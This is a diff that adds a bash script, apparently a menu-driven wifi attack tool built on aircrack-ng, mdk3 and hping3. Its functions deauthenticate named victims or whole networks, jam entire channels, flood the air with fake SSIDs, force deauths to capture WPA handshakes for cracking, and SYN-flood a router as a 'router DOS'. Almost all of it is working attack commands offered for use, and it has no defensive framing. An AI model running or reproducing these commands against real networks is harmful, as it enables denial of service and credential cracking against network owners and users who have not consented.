@@ -1,0 +1,248 @@
+#/usr/bin/env bash
+
+B='\e[1m'
+r='\e[31m'
+g='\e[1;32m'
+y='\e[1;33m'
+b='\e[1;34m'
+p='\e[1;35m'
+s='\e[0m'
+bl='\e[5m'
+
+#network interface
+phy=$(basename /sys/class/net/wl*)
+
+bye () {
+printf "${B}${y}g${s}"
+sleep 0.3
+printf "${g}o"
+sleep 0.3
+printf "${b}o"
+sleep 0.3
+printf "${p}d "
+sleep 0.3
+printf "${p}b"
+sleep 0.3
+printf "${b}y"
+sleep 0.3
+printf "${g}e "
+sleep 0.5
+printf "${bl}:)${s}"
+}
+
+
+trap_ctrlc () {
+tput bel
+printf "\n${y}Ctrl-C ${g}caught...${s}\n"
+bye
+exit 2
+}
+
+trap "trap_ctrlc" 2
+
+
+menu () {
+echo -e "${r}${B}network interface-[${g} ${phy} ${r}]
+${y}[${b}1${y}]${r}start monitor mode ${y}[${b}6${y}]${r}deauth channel
+${y}[${b}2${y}]${r}stop monitor mode  ${y}[${b}7${y}]${r}fake wifi SSID
+${y}[${b}3${y}]${r}check injection    ${y}[${b}8${y}]${r}capture handshake
+${y}[${b}4${y}]${r}run airodump-ng    ${y}[${b}9${y}]${r}router DOS
+${y}[${b}5${y}]${r}deauth wifi        ${y}[${b}0${y}]${r}EXIT
+${b}[+]${y}select any ${r}[1-0]${s}"
+read -p ":" c
+}
+
+menu
+
+
+
+
+#turn on monitor mode
+on () {
+echo -e "${B}${b}[*]${r}turning on monitor mode...${s}"
+sleep 1
+sudo xterm -e airmon-ng check kill
+echo -e "${B}${b}[*]${r}try to make interface down...${s}"
+sleep 1
+sudo xterm -e ip link set ${phy} down 2>/dev/null
+echo -e "${B}${b}[*]${r}turning on monitor mode...${s}"
+sleep 1
+sudo xterm -e ip link set ${phy} name wlan0mon 2>/dev/null
+sleep 1
+echo -e "${B}${b}[*]${r}changing card mode to monitor from managed...${s}"
+sudo xterm -e iw dev wlan0mon set type monitor
+echo -e "${B}${b}[*]${r}turned on monitor mode successfully!!!${s}"
+}
+
+
+
+
+#turn off monitor mode
+off () {
+echo -e "${B}${b}[*]${r}turning off monitor mode...${s}"
+sleep 1
+sudo xterm -e ip link set wlan0mon up
+
+echo -e "${B}${b}[*]${r}turning interface mode managed from monitor...${s}"
+sleep 1
+sudo xterm -e iw dev wlan0mon set type managed
+
+echo -e "${B}${b}[*]${r}trying to restart NetworkManager...${s}"
+sudo xterm -e service NetworkManager restart
+sleep 1
+echo -e "${B}${b}[*]${r}monitor mode turned off...${s}"
+}
+
+
+
+
+#check injection
+aireplay () {
+sudo aireplay-ng -9 wlan0mon
+}
+
+
+
+
+#run airodump-ng
+airodump () {
+echo -e "${B}${b}[+]${g}single(s) target or full(f) scan? ${r}(s/f)${s}"
+read -p ":" r
+
+if [ $r == s ]
+then
+echo -e "${B}${b}[+]${g}enter BSSID${s}"
+read -p ":" bssid
+sudo airodump-ng --bssid $bssid wlan0mon
+
+else
+sudo airodump-ng wlan0mon
+fi
+}
+
+
+
+#deauth wifi
+kick () {
+echo -e "${B}${b}[+]${g}single(s) target or full(f) wifi?${r}s/f${s}"
+read -p ":" r
+
+if [ $r == s ]
+then
+echo -e "${B}${b}[+]${g}victims MAC address${s}"
+read -p ":" mac
+echo -e "${B}${b}[+]${g}BSSID address${s}"
+read -p ":" bssid
+echo -e "${B}${b}[+]${g}number of deauth req${s}"
+read -p ":" num
+sudo aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon
+
+else
+echo -e "${B}${b}[+]${g}BSSID address${s}"
+read -p ":" bssid
+echo -e "${B}${b}[+]${g}number of deauth req${s}"
+read -p ":" num
+sudo aireplay-ng --deauth $num -D -a $bssid wlan0mon
+fi
+}
+
+
+
+#deauth wifi channel
+mdk () {
+echo -e "${B}${b}[+]${g}channel number${s}"
+read -p ":" channel
+echo -e "${B}${B}${y}[!]${r}press ( Ctrl + C ) to stop${s}"
+sudo mdk3 wlan0mon d -c $channel
+}
+
+
+
+#creat muliple fake ssid
+mdk1 () {
+echo -e "${B}${b}[+]${g}channel number (1-11)${s}"
+read -p ":" channel
+
+echo -e "${B}${b}[+]${g}txt file path${s}"
+read -p ":" txt
+
+echo -e "${B}${b}[*]${r}creating multiple SSID with mdk3..."
+sleep 1
+echo -e "${B}${b}[*]${r}muliple SSID created successfully..."
+sudo mdk3 wlan0mon b -c $channel -f $txt
+}
+
+
+
+#capture handshake
+handshake () {
+
+echo -e "${B}${b}[+]${g}enter BSSID address${s}"
+read -p ":" bssid
+
+sudo xterm -T "Trying to capture handshake | press (Ctrl + C) to stop " -e "/usr/sbin/airodump-ng --bssid $bssid --write 'captured-handshake' wlan0mon" &
+
+sudo xterm -T "Trying to deauthenticate users from the wifi" -e "/usr/sbin/aireplay-ng --deauth 200 -D -a $bssid wlan0mon" &
+}
+
+
+
+#router dos
+router () {
+echo -e "${b}[+]${g}router IP${s}"
+read -p ":" ip
+sudo hping3 -i u1 -S $ip
+}
+
+
+
+
+if [ $c == 1 ]
+then
+on;
+clear;
+akrech
+
+
+elif [ $c == 2 ]
+then
+off
+
+
+elif [ $c == 3 ]
+then
+aireplay
+
+elif [ $c == 4 ]
+then
+airodump
+
+elif [ $c == 5 ]
+then
+kick
+
+elif [ $c == 6 ]
+then
+mdk
+
+elif [ $c == 7 ]
+then
+mdk1
+
+elif [ $c == 8 ]
+then
+handshake
+
+elif [ $c == 9 ]
+then
+router
+
+elif [ $c == 0 ]
+then
+bye
+
+else
+clear;
+echo -e "${B}${r}[!]invalid command${s}"
+
+fi
